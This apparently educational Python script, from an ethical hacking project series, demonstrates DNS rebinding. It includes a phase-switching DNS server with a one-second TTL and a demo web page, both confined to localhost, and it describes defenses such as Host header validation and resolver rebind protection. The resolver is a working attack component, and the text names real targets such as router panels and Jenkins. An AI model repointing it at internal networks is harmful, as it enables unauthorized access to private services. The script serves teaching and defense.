#!/usr/bin/env python3
"""
============================================================
  PROJECT #15 MODE 2 — DNS Rebinding Attack Demo
  100 Ethical Hacking Projects Series
  Purpose : educational demo of same-origin policy bypass
  Scope   : localhost only — does NOT target real routers
============================================================
  ⚠  Run ONLY on your own machine in an isolated lab.
     DNS rebinding against real networks without consent
     is illegal. This demo targets 127.0.0.1 only.

HOW DNS REBINDING WORKS
------------------------
Same-Origin Policy (SOP) lets a page at http://evil.com
only fetch from evil.com, NOT from 192.168.1.1.

DNS rebinding bypasses this:
  1. User visits http://attacker.lab (low TTL=1s)
  2. Browser resolves attacker.lab → 1.2.3.4 (attacker IP)
  3. Attacker page loads, JS starts running
  4. TTL expires → browser re-queries DNS
  5. Attacker DNS server now returns 127.0.0.1
  6. Browser thinks attacker.lab IS 127.0.0.1 (same origin!)
  7. JS can now fetch http://attacker.lab/admin — which
     actually hits 127.0.0.1/admin (internal service)

Real-world targets: router admin panels, Jenkins, Kubernetes
dashboard, Jupyter notebooks — anything on localhost/LAN.

DEFENSE AGAINST DNS REBINDING
--------------------------------
1. DNS REBINDING PROTECTION in resolvers:
   - Unbound: private-address: 192.168.0.0/16
   - dnsmasq: --stop-dns-rebind (default in OpenWrt)
   Blocks responses with private IPs to public-name queries.

2. HOST HEADER VALIDATION in web servers:
   nginx: if ($host !~ "^(localhost|127\.0\.0\.1)$") { return 444; }
   Any request with unexpected Host: header is rejected.
   This is the most reliable per-service defense.

3. BROWSER DNS CACHE LOCKING (Chrome 94+):
   Chrome locks cached DNS entries for minimum 60s
   regardless of TTL — TTL=1 trick stops working.

4. VPN / ZERO TRUST:
   Services bound to 127.0.0.1 only, not 0.0.0.0.
   Proper network segmentation prevents lateral access.

5. CSRF TOKENS on all state-changing endpoints:
   Even if rebinding succeeds, forged requests fail CSRF check.

WHAT THIS DEMO DOES (safe version):
  Phase 1 → rebinder.lab resolves to 127.0.0.1 (attacker page)
  Phase 2 → rebinder.lab resolves to 127.0.0.1 (rebind target)
  Both phases hit localhost only — no real router attacked.
  Web page demonstrates the JS fetch + Host header mechanism.

USAGE
------
  sudo python3 dns_rebinder.py           # start DNS + HTTP servers
  # Then: add  127.0.0.1  rebinder.lab  to /etc/hosts
  # Or:   point your DNS to 127.0.0.1 and visit http://rebinder.lab
  python3 dns_rebinder.py --simulate     # full logic test, no ports
============================================================
"""

import argparse, sys, time, threading, socket, json, datetime
import http.server, urllib.parse

try:
    import dnslib
    from dnslib.server import DNSServer, BaseResolver, DNSLogger
    DNSLIB_OK = True
except ImportError:
    DNSLIB_OK = False

R="\033[0m";BOLD="\033[1m";RED="\033[91m";GREEN="\033[92m"
YELLOW="\033[93m";CYAN="\033[96m";MAGENTA="\033[95m";DIM="\033[2m"
def c(t,code): return f"{code}{t}{R}"

# ── config ────────────────────────────────────────────────
REBIND_DOMAIN  = "rebinder.lab"
PHASE1_IP      = "127.0.0.1"   # "attacker" IP (localhost in safe demo)
PHASE2_IP      = "127.0.0.1"   # rebind target (also localhost — safe)
TTL_SHORT      = 1             # 1 second TTL — forces fast re-query
DNS_PORT       = 5353          # non-privileged port for demo; use 53 with sudo
HTTP_PORT      = 8080

# per-client state: {client_ip → query_count}
query_counts   = {}
query_lock     = threading.Lock()
event_log      = []

# ─────────────────────────────────────────────────────────
# DNS RESOLVER — phase-switching logic
# ─────────────────────────────────────────────────────────
class RebindResolver(BaseResolver if DNSLIB_OK else object):
    """
    First query for rebinder.lab → PHASE1_IP  (attacker's server)
    Subsequent queries           → PHASE2_IP  (rebind target)
    TTL=1 forces client to re-query after 1 second.
    """

    def resolve(self, request, handler):
        import dnslib
        qname  = str(request.q.qname).rstrip(".")
        client = handler.client_address[0]
        ts     = datetime.datetime.now().strftime("%H:%M:%S")

        with query_lock:
            count = query_counts.get(client, 0) + 1
            query_counts[client] = count

        # phase logic
        if count == 1:
            ip    = PHASE1_IP
            phase = "PHASE 1"
            color = GREEN
        else:
            ip    = PHASE2_IP
            phase = "PHASE 2 (REBIND)"
            color = RED

        event_log.append({"time":ts, "client":client, "domain":qname,
                           "ip":ip, "phase":phase, "query_n":count})

        print(f"  {c(ts, DIM)}  {c(phase, color):<28}  "
              f"client={c(client, MAGENTA)}  "
              f"{c(qname, CYAN)} → {c(ip, color)}")

        reply = request.reply()
        if qname == REBIND_DOMAIN or qname.endswith("." + REBIND_DOMAIN):
            reply.add_answer(dnslib.RR(
                rname   = request.q.qname,
                rtype   = dnslib.QTYPE.A,
                rdata   = dnslib.A(ip),
                ttl     = TTL_SHORT,
            ))
        else:
            # pass-through for other domains — return empty
            pass

        return reply

# ─────────────────────────────────────────────────────────
# HTTP SERVER — serves the demo page
# ─────────────────────────────────────────────────────────
DEMO_HTML = """<!DOCTYPE html>
<html>
<head>
<title>DNS Rebinding Demo — Educational</title>
<style>
  body { font-family: monospace; background: #0d1117; color: #c9d1d9; padding: 20px; }
  h1   { color: #ff6b6b; }
  h2   { color: #58a6ff; }
  .box { background: #161b22; border: 1px solid #30363d; padding: 15px;
         border-radius: 6px; margin: 10px 0; }
  .green  { color: #3fb950; }
  .red    { color: #ff6b6b; }
  .yellow { color: #e3b341; }
  button  { background: #238636; color: white; border: none; padding: 8px 16px;
            cursor: pointer; border-radius: 4px; margin: 4px; }
  button.red { background: #da3633; }
  pre     { background: #0d1117; padding: 10px; overflow-x: auto; }
  #log    { height: 200px; overflow-y: auto; background: #010409;
            padding: 10px; border: 1px solid #30363d; }
</style>
</head>
<body>
<h1>⚠ DNS Rebinding Attack Demo</h1>
<div class="box">
  <h2>Educational Purpose Only</h2>
  <p>This page demonstrates how DNS rebinding bypasses the Same-Origin Policy.</p>
  <p>The DNS server returned <strong class="red">TTL=1s</strong> for this domain.
     After 1 second, the browser re-queries DNS and receives a different IP.
     The browser still thinks it's talking to the same origin.</p>
</div>

<div class="box">
  <h2>Attack Flow</h2>
  <pre>
1. User visits http://rebinder.lab:8080
   DNS query #1 → rebinder.lab = 127.0.0.1 (this server)  [PHASE 1]

2. Page loads, JS waits for TTL to expire (1 second)

3. JS re-queries DNS (forces via fetch to a new sub-path)
   DNS query #2 → rebinder.lab = 127.0.0.1 (rebind target) [PHASE 2]

4. Browser sees same hostname → same origin → allows fetch
   JS can now read responses from the "internal" service
  </pre>
</div>

<div class="box">
  <h2>Live Demo — Fetch Simulation</h2>
  <button onclick="runDemo()">Run Rebind Demo</button>
  <button class="red" onclick="clearLog()">Clear</button>
  <div id="log"></div>
</div>

<div class="box">
  <h2>Why This Is Dangerous</h2>
  <ul>
    <li>Real targets: Kubernetes dashboard, Jenkins, Jupyter, router admin (192.168.1.1)</li>
    <li>JS can read <em>any</em> response once rebinding succeeds — exfil internal data</li>
    <li>No user interaction needed after initial page visit</li>
    <li>Works even with HTTPS on external site (if internal is HTTP)</li>
  </ul>
</div>

<div class="box" style="border-color:#3fb950">
  <h2 class="green">Defenses</h2>
  <ul>
    <li><strong class="green">Host header validation</strong> — reject requests with unexpected Host:</li>
    <li><strong class="green">DNS rebind protection</strong> — block private IPs in public DNS responses</li>
    <li><strong class="green">Chrome DNS cache lock (94+)</strong> — ignores TTL &lt; 60s</li>
    <li><strong class="green">Bind services to 127.0.0.1 only</strong>, not 0.0.0.0</li>
    <li><strong class="green">CSRF tokens</strong> on all state-changing endpoints</li>
  </ul>
</div>

<script>
const log = document.getElementById('log');
function addLog(msg, cls='') {
  const d = new Date().toLocaleTimeString();
  log.innerHTML += `<span class="${cls}">[${d}] ${msg}</span>\\n`;
  log.scrollTop = log.scrollHeight;
}
function clearLog() { log.innerHTML = ''; }

async function runDemo() {
  addLog('=== DNS Rebinding Demo Starting ===', 'yellow');
  addLog('Phase 1: Fetching /api/info (initial origin)...', 'green');

  try {
    const r1 = await fetch('/api/info');
    const d1 = await r1.json();
    addLog(`Phase 1 response: ${JSON.stringify(d1)}`, 'green');
  } catch(e) {
    addLog(`Phase 1 fetch: ${e.message}`, 'red');
  }

  addLog('Waiting 1.5s for DNS TTL to expire...', 'yellow');
  await new Promise(r => setTimeout(r, 1500));

  addLog('Phase 2: Re-fetching after TTL expiry (rebind)...', 'red');
  addLog('In a real attack, DNS now returns internal IP (e.g. 192.168.1.1)', 'red');
  addLog('Browser still sees same Host header → same-origin → fetch allowed', 'red');

  try {
    const r2 = await fetch('/api/rebind-status');
    const d2 = await r2.json();
    addLog(`Phase 2 response: ${JSON.stringify(d2)}`, 'red');
  } catch(e) {
    addLog(`Phase 2 fetch: ${e.message}`, 'red');
  }

  addLog('=== Demo Complete — In real attack, internal data would be exfiltrated ===', 'yellow');
}
</script>
</body>
</html>"""


class DemoHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass  # suppress default logs

    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path

        if path == "/" or path == "/index.html":
            body = DEMO_HTML.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", len(body))
            self.end_headers()
            self.wfile.write(body)

        elif path == "/api/info":
            data = json.dumps({
                "server"     : "rebinder.lab demo",
                "phase"      : 1,
                "host_header": self.headers.get("Host", "?"),
                "time"       : datetime.datetime.now().isoformat(),
            }).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", len(data))
            self.end_headers()
            self.wfile.write(data)

        elif path == "/api/rebind-status":
            data = json.dumps({
                "rebind_complete" : True,
                "phase"           : 2,
                "note"            : "DNS TTL expired — browser re-queried DNS",
                "host_header"     : self.headers.get("Host", "?"),
                "defense"         : "Host header validation would block this",
            }).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", len(data))
            self.end_headers()
            self.wfile.write(data)

        else:
            self.send_response(404)
            self.end_headers()

# ─────────────────────────────────────────────────────────
# SIMULATION — no actual ports, tests logic
# ─────────────────────────────────────────────────────────
def simulate():
    print()
    print(c("  ╔══════════════════════════════════════════════════════╗", CYAN))
    print(c("  ║   PROJECT #15 · DNS REBINDER  [SIMULATION]           ║", CYAN))
    print(c("  ╚══════════════════════════════════════════════════════╝", CYAN))
    print()

    # simulate the query-count phase-switch logic
    test_queries = [
        ("client1", 1, PHASE1_IP, "PHASE 1"),
        ("client1", 2, PHASE2_IP, "PHASE 2 (REBIND)"),
        ("client1", 3, PHASE2_IP, "PHASE 2 (REBIND)"),
        ("client2", 1, PHASE1_IP, "PHASE 1"),  # new client resets
        ("client2", 2, PHASE2_IP, "PHASE 2 (REBIND)"),
    ]

    print(f"  {'CLIENT':<10}  {'QUERY#':<8}  {'PHASE':<22}  {'RETURNED IP':<16}  CHECK")
    print("  "+c("─"*70, DIM))

    all_pass = True
    local_counts = {}
    for client, expected_n, expected_ip, expected_phase in test_queries:
        n = local_counts.get(client, 0) + 1
        local_counts[client] = n
        ip    = PHASE1_IP if n == 1 else PHASE2_IP
        phase = "PHASE 1" if n == 1 else "PHASE 2 (REBIND)"

        ok = (n == expected_n and ip == expected_ip and phase == expected_phase)
        all_pass = all_pass and ok
        icon = c("✔", GREEN) if ok else c("✗", RED)
        print(f"  {c(client, MAGENTA):<19}  {c(str(n), YELLOW):<16}  "
              f"{c(phase, GREEN if n==1 else RED):<31}  {c(ip, CYAN):<25}  {icon}")

    # TTL impact
    print(c(f"\n  ── TTL ANALYSIS ────────────────────────────────────────", CYAN))
    print(f"  TTL = {c(str(TTL_SHORT)+'s', RED+BOLD)}  → browser re-queries after {TTL_SHORT} second")
    print(f"  Normal TTL = 300s → browser caches for 5 min, rebinding impossible")
    print(f"  Chrome 94+ minimum TTL = 60s → TTL={TTL_SHORT}s ignored")
    print(c("  Defense: Chrome's DNS cache lock defeats this attack in modern browsers.", GREEN))

    # Host header defense simulation
    print(c(f"\n  ── HOST HEADER VALIDATION (defense demo) ────────────────", CYAN))
    requests = [
        ("rebinder.lab:8080", True,  "expected host — allow"),
        ("192.168.1.1",       False, "unexpected host — block (nginx: return 444)"),
        ("localhost",         True,  "expected host — allow"),
        ("attacker.com",      False, "unexpected host — BLOCK"),
    ]
    allowed_hosts = {"rebinder.lab:8080", "localhost", "127.0.0.1:8080"}
    for host, _, note in requests:
        allowed = host in allowed_hosts
        icon    = c("✔ ALLOW", GREEN) if allowed else c("✗ BLOCK", RED)
        print(f"  Host: {c(f'{host:<25}', YELLOW)}  {icon}  {c(note, DIM)}")

    print()
    verdict = c("  ✔ ALL ASSERTIONS PASSED", GREEN+BOLD) if all_pass else c("  ✗ FAILED", RED)
    print(verdict)
    print()

# ─────────────────────────────────────────────────────────
# LIVE SERVER
# ─────────────────────────────────────────────────────────
def run_servers(dns_port, http_port):
    if not DNSLIB_OK:
        print(c("  dnslib not installed: pip install dnslib", RED)); sys.exit(1)

    print()
    print(c("  ╔══════════════════════════════════════════════════════╗", CYAN))
    print(c("  ║   PROJECT #15 · DNS REBINDER                         ║", CYAN))
    print(c("  ╚══════════════════════════════════════════════════════╝", CYAN))
    print()
    print(c("  ⚠  Educational demo — targets localhost only.", RED))
    print()
    print(f"  DNS server  : {c('0.0.0.0:'+str(dns_port), YELLOW)}")
    print(f"  HTTP server : {c('http://127.0.0.1:'+str(http_port), YELLOW)}")
    print(f"  Domain      : {c(REBIND_DOMAIN, CYAN)}")
    print(f"  TTL         : {c(str(TTL_SHORT)+'s', RED+BOLD)}")
    print()
    print(c("  Setup:", DIM))
    print(c(f"    echo '127.0.0.1 {REBIND_DOMAIN}' | sudo tee -a /etc/hosts", MAGENTA))
    print(c(f"    Then visit: http://{REBIND_DOMAIN}:{http_port}", MAGENTA))
    print()
    print(f"  {'TIME':13}  {'PHASE':<22}  CLIENT             DOMAIN → IP")
    print("  "+c("─"*75, DIM))

    # DNS server
    resolver = RebindResolver()
    logger   = DNSLogger(prefix=False)
    dns_srv  = DNSServer(resolver, port=dns_port, address="0.0.0.0",
                         logger=logger)
    dns_srv.start_thread()

    # HTTP server
    httpd = http.server.HTTPServer(("127.0.0.1", http_port), DemoHandler)
    http_thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    http_thread.start()

    print(c(f"  ✔ DNS  server running on port {dns_port}", GREEN))
    print(c(f"  ✔ HTTP server running on port {http_port}", GREEN))
    print(c(f"  Ctrl+C to stop\n", DIM))

    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        dns_srv.stop()
        httpd.shutdown()
        print(c(f"\n  Stopped. {len(event_log)} DNS queries served.\n", YELLOW))

# ─────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="Project #15 — DNS Rebinder")
    parser.add_argument("--dns-port",  type=int, default=DNS_PORT)
    parser.add_argument("--http-port", type=int, default=HTTP_PORT)
    parser.add_argument("--simulate",  action="store_true")
    args = parser.parse_args()
    if args.simulate: simulate()
    else: run_servers(args.dns_port, args.http_port)

if __name__ == "__main__": main()